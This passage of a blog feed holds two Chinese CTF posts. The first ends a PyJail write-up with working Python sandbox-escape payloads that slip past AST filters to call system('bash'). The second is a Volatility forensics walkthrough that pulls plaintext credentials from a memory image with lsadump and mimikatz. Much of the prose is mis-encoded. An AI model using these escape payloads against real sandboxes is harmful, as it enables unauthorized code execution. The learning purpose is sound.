class="number">0</span>]              <span class="comment"># bash</span></span><br></pre></td></tr></table></figure></div><h4 id="ç»•è¿‡-astsubscript-è·å–åˆ—è¡¨å­—å…¸å…ƒç´ "><a class="markdownIt-Anchor" href="#ç»•è¿‡-astsubscript-è·å–åˆ—è¡¨å­—å…¸å…ƒç´ ">#</a> ç»•è¿‡ ast.Subscript è·å–åˆ—è¡¨ / å­—å…¸å…ƒç´ </h4><p>é¢˜ç›®åŒæ—¶é™å®šäº† ast.Subscriptï¼Œå› æ­¤æ— æ³•ç›´æ¥ä½¿ç”¨ç´¢å¼•ã€‚ä½† BUILTINS ä¸­ç»™å‡ºäº† min å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥è·å–åˆ—è¡¨ä¸­æœ€å°çš„å…ƒç´ ï¼Œå½“åˆ—è¡¨ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥å–å€¼ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(system=[])))            <span class="comment"># system</span></span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[])))       <span class="comment"># _wrap_close</span></span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(bash=[])))              <span class="comment"># bash</span></span><br></pre></td></tr></table></figure></div><p>å¦‚æœè¦è·å–å­—å…¸å…ƒç´ ï¼Œå¯ä»¥åˆ©ç”¨ get å‡½æ•°æ¥æ›¿ä»£ Subscriptã€‚ä¾‹å¦‚æˆ‘éœ€è¦åœ¨ globals å­—å…¸ä¸­è·å– key ä¸º system çš„å…ƒç´ ï¼Œå¯ä»¥é…åˆ match/case æ¥è·å–ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">globals</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(get=get_func):</span><br><span class="line">        get_func(<span class="string">&quot;system&quot;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="ç»•è¿‡-astfor-éå†åˆ—è¡¨"><a class="markdownIt-Anchor" href="#ç»•è¿‡-astfor-éå†åˆ—è¡¨">#</a> ç»•è¿‡ ast.For éå†åˆ—è¡¨</h4><p>åœ¨æ„é€ æœ€ç»ˆ payload ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨  <code>__subclasses__()</code>  å¾—åˆ°çš„åˆ—è¡¨ä¸­è·å–åˆ° _wrap_close ç±»ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;bash&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>å½“åˆ—è¡¨ä¸­ä¸åªæœ‰ä¸€ä¸ªå…ƒç´ ä¸”åˆ—è¡¨ä¸­çš„å…ƒç´ ä¹‹é—´æ— æ³•æ¯”è¾ƒæ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ for æ¥éå†å¹¶åˆ¤æ–­ï¼Œä½† ast.For è¢«é¢˜ç›®è¿‡æ»¤äº†ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ filterï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter_func</span>(<span class="params">subclazzes_item</span>):</span><br><span class="line">    [ _wrap_close:=<span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[])))]</span><br><span class="line">    <span class="keyword">match</span> subclazzes_item:</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">object</span>(_ï¼¿name_ï¼¿=name):</span><br><span class="line">            <span class="keyword">if</span> name==_wrap_close:</span><br><span class="line">                <span class="keyword">return</span> subclazzes_item</span><br><span class="line">[</span><br><span class="line">    subclazzes_item:=<span class="built_in">min</span>(<span class="built_in">filter</span>(filter_func,subclazzes()))</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p>fitler ä¸­ä½¿ç”¨ match/case å’Œ if æ¥è¿›è¡Œè¿‡æ»¤ã€‚</p><p>é™¤äº†ä½¿ç”¨ filter å‡½æ•°å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ iter å’Œ next å‡½æ•°æ¥éå†åˆ—è¡¨ï¼Œä½†é¢˜ç›® BUILTINS ä¸­æ²¡æœ‰ç»™å‡ºè¿™ä¸¤ä¸ªå‡½æ•°ã€‚</p><h2 id="end"><a class="markdownIt-Anchor" href="#end">#</a> END</h2><p>è´´ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„ Python æ²™ç®±é€ƒé€¸ payload bypass æ¡†æ¶ï¼Œä¸çŸ¥é“å°†æ¥ç”¨ä¸ç”¨å¾—åˆ°</p><p><a class="link" href="https://github.com/Macr0phag3/parselmouth">GitHub - Macr0phag3/parselmouth <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pyjail&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pyjail&quot;&gt;#&lt;/a&gt; PyJail&lt;/h1&gt;
&lt;h2 id=&quot;pythonçš„ä¸€äº›ç‰¹æ€§&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pytho</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Volatility</title>
    <link href="http://example.com/2024/04/27/Volatility/"/>
    <id>http://example.com/2024/04/27/Volatility/</id>
    <published>2024-04-27T13:21:27.000Z</published>
    <updated>2024-04-28T06:01:31.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="volatility"><a class="markdownIt-Anchor" href="#volatility">#</a> Volatility</h1><h2 id="å…ˆä»¥otterctfä¸ºä¾‹"><a class="markdownIt-Anchor" href="#å…ˆä»¥otterctfä¸ºä¾‹">#</a> å…ˆä»¥ OtterCTF ä¸ºä¾‹</h2><h3 id="æŸ¥çœ‹é•œåƒä¿¡æ¯"><a class="markdownIt-Anchor" href="#æŸ¥çœ‹é•œåƒä¿¡æ¯">#</a> æŸ¥çœ‹é•œåƒä¿¡æ¯</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem imageinfo</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/KXFZGlghQHNO1pV.png" alt="image.png"></p><p>ä¼šå­˜åœ¨å¾ˆå¤šé•œåƒï¼Œä¸€èˆ¬ç¬¬ä¸€ä¸ªå°±æ˜¯å¯¹çš„ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤éªŒè¯</p><h3 id="è°ƒå‡ºshellçª—å£"><a class="markdownIt-Anchor" href="#è°ƒå‡ºshellçª—å£">#</a> è°ƒå‡º shell çª—å£</h3><p>å¯ä»¥æµ‹è¯•ä½ çŒœæµ‹çš„ç³»ç»Ÿæ˜¯å¦æ­£ç¡®ï¼Œæ­£ç¡®çš„è¯å°±èƒ½ getshell</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 volshell</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/ifqPBN6nQaem9xy.png" alt="image.png"></p><h3 id="è·å–é•œåƒçš„ç”¨æˆ·åå¯†ç "><a class="markdownIt-Anchor" href="#è·å–é•œåƒçš„ç”¨æˆ·åå¯†ç ">#</a> è·å–é•œåƒçš„ç”¨æˆ·åå¯†ç </h3><p>å¯ä»¥ä½¿ç”¨ hashdumpï¼Œä½†å¾—åˆ°å¯†ç éƒ½æ˜¯å“ˆå¸ŒåŠ å¯†ä¹‹åçš„ï¼Œä½¿ç”¨ lsadump æˆ–è€… mimikatz å¯ä»¥å¾—åˆ°æ˜æ–‡</p><p>ç›´æ¥åˆ©ç”¨åä¸¤ä¸ªæ’ä»¶ï¼Œ</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 lsadump</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/agyq4mCIkoNDTxf.png" alt="image.png"></p><p><code>vol.py --plugins=/home/kali/Tools/volatility/volatility/plugins -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 mimikatz</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/KOo1QvPUIL5SlEN.png" alt="image.png"></p><h3 id="è·å–ipåœ°å€"><a class="markdownIt-Anchor" href="#è·å–ipåœ°å€">#</a> è·å– ip åœ°å€</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 netscan</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/xWKpT6HfXEYjmM3.png" alt="image.png"></p><h3 id="è·å–ä¸»æœºå"><a class="markdownIt-Anchor" href="#è·å–ä¸»æœºå">#</a> è·å–ä¸»æœºå</h3><h4 id="æŸ¥æ³¨å†Œè¡¨"><a class="markdownIt-Anchor" href="#æŸ¥æ³¨å†Œè¡¨">#</a> æŸ¥æ³¨å†Œè¡¨</h4><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 hivelist</code> 1</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/27/Ru2EskHAVjNKnLS.png" alt="image.png"></p><p>ä¸»æœºåä¿¡æ¯åœ¨ SYSTEM çš„é‚£ä¸€æ¡è®°å½•ä¸­ï¼Œå†ç”¨ <code>-o + Virtual printkey</code>  æ¥æŸ¥çœ‹æŒ‡å®šçš„è®°å½•</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/zX3WmVt7.png" alt="1714225836369.png"></p><p>è·Ÿè¿› ControlSet001</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/AmM6lBI3.png" alt="1714225968337.png"></p><p>ç»§ç»­è·Ÿè¿› Control</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/nrln55Q5.png" alt="1714226095273.png"></p><p>è·Ÿè¿› ComputerName</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control\ComputerName&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/hytyDofb.png" alt="1714226188973.png"></p><p>ç»§ç»­è·Ÿè¿› ComputerName</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/VY8kbFyI.png" alt="1714226289670.png"></p><p>åˆ°å¤„æ³¨å†Œè¡¨ï¼š <code>hivedump</code></p><h3 id="æŸ¥çœ‹è¿›ç¨‹"><a class="markdownIt-Anchor" href="#æŸ¥çœ‹è¿›ç¨‹">#</a> æŸ¥çœ‹è¿›ç¨‹</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 pslist</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/9MVecqc2.png" alt="1714227976982.png"></p><p>é¢˜ç›®è¦æ±‚æ‰¾åˆ°ä»–ç©çš„æ¸¸æˆï¼Œæ’é™¤è®¤è¯†çš„ç¨‹åºï¼Œæ‰¾ä¸è®¤è¯†çš„ç™¾åº¦ä¸€ä¸‹ï¼Œè¿™ä¸ª lunarMS å°±æ˜¯ç­”æ¡ˆï¼Œè¿˜éœ€è¦æ‰¾å‡ºæ¸¸æˆçš„æœåŠ¡å™¨ ipï¼Œç”¨ grep æ­£åˆ™è¡¨è¾¾</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/27/VytbGj3H.png" alt="1714231953244.png"></p><h3 id="æå–è¿›ç¨‹"><a class="markdownIt-Anchor" href="#æå–è¿›ç¨‹">#</a> æå–è¿›ç¨‹</h3><p>1.memdump å°†è¿›ç¨‹ä»¥ dmp æ–‡ä»¶ä¿å­˜</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 memdump -p 708 -D /home/kali</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/y5fOqc3A.png" alt="1714273354650.png"></p><p>åœ¨åˆ©ç”¨ strings æå–å­—ç¬¦ä¸²æ‰¾åˆ°æ¸¸æˆè´¦å·</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/lxorhNOd.png" alt="1714273819021.png"></p><p>2. æå–å®Œæ•´è¿›ç¨‹</p><p>ç”¨ procdump æå–</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 procdump -p 3720 -D /home/kali</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/wiWQTqG0.png" alt="1714276933594.png"></p><h3 id="æŸ¥çœ‹å‰ªåˆ‡æ¿"><a class="markdownIt-Anchor" href="#æŸ¥çœ‹å‰ªåˆ‡æ¿">#</a> æŸ¥çœ‹å‰ªåˆ‡æ¿</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 clipboard</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/OG2gk9ul.png" alt="1714274863169.png"></p><p>è·å¾—é‚®ç®±</p><h3 id="æŸ¥çœ‹è¿›ç¨‹æ ‘"><a class="markdownIt-Anchor" href="#æŸ¥çœ‹è¿›ç¨‹æ ‘">#</a> æŸ¥çœ‹è¿›ç¨‹æ ‘</h3><p>é¢˜ç›®è¦æ±‚æ‰¾åˆ°æ¶æ„ç¨‹åº</p><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 pstree</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/cWd85PrG.png" alt="1714275093047.png"></p><p>å¯ä»¥ç”¨ dlllist æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹ç›¸å…³çš„ dll æ–‡ä»¶åˆ—è¡¨</p><h3 id="æŸ¥çœ‹dllæ–‡ä»¶åˆ—è¡¨"><a class="markdownIt-Anchor" href="#æŸ¥çœ‹dllæ–‡ä»¶åˆ—è¡¨">#</a> æŸ¥çœ‹ dll æ–‡ä»¶åˆ—è¡¨</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3720</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/GVnk8dUj.png" alt="1714275458700.png"></p><p>è¿è¡Œåœ¨ temp ä¸­ï¼Œä¸å¤ªæ­£ç»ï¼Œå°±æ˜¯é¢˜ç›®ç­”æ¡ˆ</p><h3 id="æ‰«ææ–‡ä»¶"><a class="markdownIt-Anchor" href="#æ‰«ææ–‡ä»¶">#</a> æ‰«ææ–‡ä»¶</h3><p><code>vol.py -f /home/kali/Desktop/OtterCTF.vmem --profile=Win7SP1x64 filescan |grep &quot;Rick And Morty&quot;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/04/28/6P7Ze8HX.png" alt="1714276122628.png"></p><h2 id="volpy"><a class="markdownIt-Anchor" href="#volpy">#</a> <a class="link" href="http://vol.py">vol.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -h</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">  -h, --help            list all available options and their default values.</span><br><span class="line">                        Default values may be set in the configuration file</span><br><span class="line">                        (/etc/volatilityrc)</span><br><span class="line">  --conf-file=/home/kali/.volatilityrc</span><br><span class="line">                        User based configuration file</span><br><span class="line">  -d, --debug           Debug volatility</span><br><span class="line">  --plugins=PLUGINS     Additional plugin directories to use (colon separated)</span><br><span class="line">  --info                Print information about all registered objects</span><br><span class="line">  --cache-directory=/home/kali/.cache/volatility</span><br><span class="line">                        Directory where cache files are stored</span><br><span class="line">  --cache               Use caching</span><br><span class="line">  --tz=TZ               Sets the (Olson) timezone for displaying timestamps</span><br><span class="line">                        using pytz (if installed) or tzset</span><br><span class="line">  -f FILENAME, --filename=FILENAME</span><br><span class="line">                        Filename to use when opening an image</span><br><span class="line">  --profile=WinXPSP2x86</span><br><span class="line">                        Name of the profile to load (use --info to see a list</span><br><span class="line">                        of supported profiles)</span><br><span class="line">  -l LOCATION, --location=LOCATION</span><br><span class="line">                        A URN location from which to load an address space</span><br><span class="line">  -w, --write           Enable write support</span><br><span class="line">  --dtb=DTB             DTB Address</span><br><span class="line">  --shift=SHIFT         Mac KASLR shift address</span><br><span class="line">  --output=text         Output in this format (support is module specific, see</span><br><span class="line">                        the Module Output Options below)</span><br><span class="line">  --output-file=OUTPUT_FILE</span><br><span class="line">                        Write output in this file</span><br><span class="line">  -v, --verbose         Verbose information</span><br><span class="line">  --physical_shift=PHYSICAL_SHIFT</span><br><span class="line">                        Linux kernel physical shift address</span><br><span class="line">  --virtual_shift=VIRTUAL_SHIFT</span><br><span class="line">                        Linux kernel virtual shift address</span><br><span class="line">  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: for 64-bit</span><br><span class="line">                        Windows 8 and above this is the address of</span><br><span class="line">                        KdCopyDataBlock)</span><br><span class="line">  --force               Force utilization of suspect profile</span><br><span class="line">  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address</span><br><span class="line">  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid for</span><br><span class="line">                        Windows 10 only)</span><br><span class="line"></span><br><span class="line">        Supported Plugin Commands:</span><br><span class="line"></span><br><span class="line">                amcache         Print AmCache information</span><br><span class="line">                apihooks        Detect API hooks in process and kernel memory</span><br><span class="line">                atoms           Print session and window station atom tables</span><br><span class="line">                atomscan        Pool scanner for atom tables</span><br><span class="line">                auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv</span><br><span class="line">                bigpools        Dump the big page pools using BigPagePoolScanner</span><br><span class="line">                bioskbd         Reads the keyboard buffer from Real Mode memory</span><br><span class="line">                cachedump       Dumps cached domain hashes from memory</span><br><span class="line">                callbacks       Print system-wide notification routines</span><br><span class="line">                clipboard       Extract the contents of the windows clipboard</span><br><span class="line">                cmdline         Display process command-line arguments #æ˜¾ç¤ºå‘½ä»¤è¡Œå‚æ•°</span><br><span class="line">                cmdscan         Extract command history by scanning for _COMMAND_HISTORY  #æå–å‘½ä»¤è¡Œå†å²è®°å½•ï¼ˆ_COMMAND_HISTORYï¼‰</span><br><span class="line">                connections     Print list of open connections [Windows XP and 2003 Only]</span><br><span class="line">                connscan        Pool scanner for tcp connections</span><br><span class="line">                consoles        Extract command history by scanning for _CONSOLE_INFORMATION #æå–å‘½ä»¤è¡Œå†å²è®°å½•æ‰«æ_CONSOLE_INFORMATIONï¼‰</span><br><span class="line">                crashinfo       Dump crash-dump information</span><br><span class="line">                deskscan        Poolscaner for tagDESKTOP (desktops)</span><br><span class="line">                devicetree      Show device tree</span><br><span class="line">                dlldump         Dump DLLs from a process address space</span><br><span class="line">                dlllist         Print list of loaded dlls for each process #æ‰“å°è¿›ç¨‹çš„åŠ¨æ€é“¾æ¥åº“åˆ—è¡¨</span><br><span class="line">                driverirp       Driver IRP hook detection</span><br><span class="line">                drivermodule    Associate driver objects to kernel modules</span><br><span class="line">                driverscan      Pool scanner for driver objects</span><br><span class="line">                dumpcerts       Dump RSA private and public SSL keys</span><br><span class="line">                dumpfiles       Extract memory mapped and cached files</span><br><span class="line">                dumpregistry    Dumps registry files out to disk </span><br><span class="line">                editbox         Displays information about Edit controls. (Listbox experimental.)</span><br><span class="line">                envars          Display process environment variables</span><br><span class="line">                eventhooks      Print details on windows event hooks</span><br><span class="line">                evtlogs         Extract Windows Event Logs (XP/2003 only)</span><br><span class="line">                filescan        Pool scanner for file objects #æ‰«ææ–‡ä»¶å¯¹è±¡ä¿¡æ¯</span><br><span class="line">                gahti           Dump the USER handle type information</span><br><span class="line">                gditimers       Print installed GDI timers and callbacks</span><br><span class="line">                gdt             Display Global Descriptor Table</span><br><span class="line">                getservicesids  Get the names of services in the Registry and return Calculated SID</span><br><span class="line">                getsids         Print the SIDs owning each process</span><br><span class="line">                handles         Print list of open handles for each process</span><br><span class="line">                hashdump        Dumps passwords hashes (LM/NTLM) from memory #è½¬å‚¨å†…å­˜ä¸­çš„Windowsè´¦å·å¯†ç å“ˆå¸Œ</span><br><span class="line">                hibinfo         Dump hibernation file information</span><br><span class="line">                hivedump        Prints out a hive #è½¬å‚¨æ³¨å†Œè¡¨é…ç½®å•å…ƒä¿¡æ¯</span><br><span class="line">                hivelist        Print list of registry hives. #æ‰“å°æ³¨å†Œè¡¨é…ç½®å•å…ƒåˆ—è¡¨</span><br><span class="line">                hivescan        Pool scanner for registry hives</span><br><span class="line">                hpakextract     Extract physical memory from an HPAK file</span><br><span class="line">                hpakinfo        Info on an HPAK file</span><br><span class="line">                idt             Display Interrupt Descriptor Table</span><br><span class="line">                iehistory       Reconstruct Internet Explorer cache / history #é‡å»ºIEç¼“å­˜åŠè®¿é—®å†å²è®°å½•</span><br><span class="line">                imagecopy       Copies a physical address space out as a raw DD image</span><br><span class="line">                imageinfo       Identify information for the image  #æŸ¥çœ‹é•œåƒä¿¡æ¯</span><br><span class="line">                impscan         Scan for calls to imported functions</span><br><span class="line">                joblinks        Print process job link information</span><br><span class="line">                kdbgscan        Search for and dump potential KDBG values</span><br><span class="line">                kpcrscan        Search for and dump potential KPCR values</span><br><span class="line">                ldrmodules      Detect unlinked DLLs</span><br><span class="line">                lsadump         Dump (decrypted) LSA secrets from the registry</span><br><span class="line">                machoinfo       Dump Mach-O file format information</span><br><span class="line">                malfind         Find hidden and injected code</span><br><span class="line">                mbrparser       Scans for and parses potential Master Boot Records (MBRs) </span><br><span class="line">                memdump         Dump the addressable memory for a process #è½¬å‚¨è¿›ç¨‹çš„å¯å¯»å€å†…å­˜</span><br><span class="line">                memmap          Print the memory map</span><br><span class="line">                messagehooks    List desktop and thread window message hooks</span><br><span class="line">                mftparser       Scans for and parses potential MFT entries </span><br><span class="line">                moddump         Dump a kernel driver to an executable file sample</span><br><span class="line">                modscan         Pool scanner for kernel modules</span><br><span class="line">                modules         Print list of loaded modules</span><br><span class="line">                multiscan       Scan for various objects at once</span><br><span class="line">                mutantscan      Pool scanner for mutex objects</span><br><span class="line">                notepad         List currently displayed notepad text</span><br><span class="line">   netscan #æ‰«æç½‘ç»œæƒ…å†µ</span><br><span class="line">   objtypescan     Scan for Windows object type objects</span><br><span class="line">                patcher         Patches memory based on page scans</span><br><span class="line">                poolpeek        Configurable pool scanner plugin</span><br><span class="line">                printkey        Print a registry key, and its subkeys and values #æ‰“å°æ³¨å†Œè¡¨é¡¹åŠå…¶å­é¡¹å’Œå€¼</span><br><span class="line">                privs           Display process privileges</span><br><span class="line">                procdump        Dump a process to an executable file sample # è¿›ç¨‹è½¬å‚¨åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ç¤ºä¾‹</span><br><span class="line">                pslist          Print all running processes by following the EPROCESS lists  #æ‰“å°è¿›ç¨‹</span><br><span class="line">                psscan          Pool scanner for process objects #è¿›ç¨‹å¯¹è±¡æ± æ‰«æ</span><br><span class="line">                pstree          Print process list as a tree #ä»¥æ ‘å‹æ–¹å¼æ‰“å°è¿›ç¨‹åˆ—è¡¨</span><br><span class="line">                psxview         Find hidden processes with various process listings #æŸ¥æ‰¾å¸¦æœ‰éšè—è¿›ç¨‹çš„æ‰€æœ‰è¿›ç¨‹åˆ—è¡¨</span><br><span class="line">                qemuinfo        Dump Qemu information</span><br><span class="line">                raw2dmp         Converts a physical memory sample to a windbg crash dump</span><br><span class="line">                screenshot      Save a pseudo-screenshot based on GDI windows</span><br><span class="line">                servicediff     List Windows services (ala Plugx)</span><br><span class="line">                sessions        List details on _MM_SESSION_SPACE (user logon sessions)</span><br><span class="line">                shellbags       Prints ShellBags info</span><br><span class="line">                shimcache       Parses the Application Compatibility Shim Cache registry key</span><br><span class="line">                shutdowntime    Print ShutdownTime of machine from registry</span><br><span class="line">                sockets         Print list of open sockets</span><br><span class="line">                sockscan        Pool scanner for tcp socket objects</span><br><span class="line">                ssdt            Display SSDT entries</span><br><span class="line">                strings         Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">                svcscan         Scan for Windows services</span><br><span class="line">                symlinkscan     Pool scanner for symlink objects</span><br><span class="line">                thrdscan        Pool 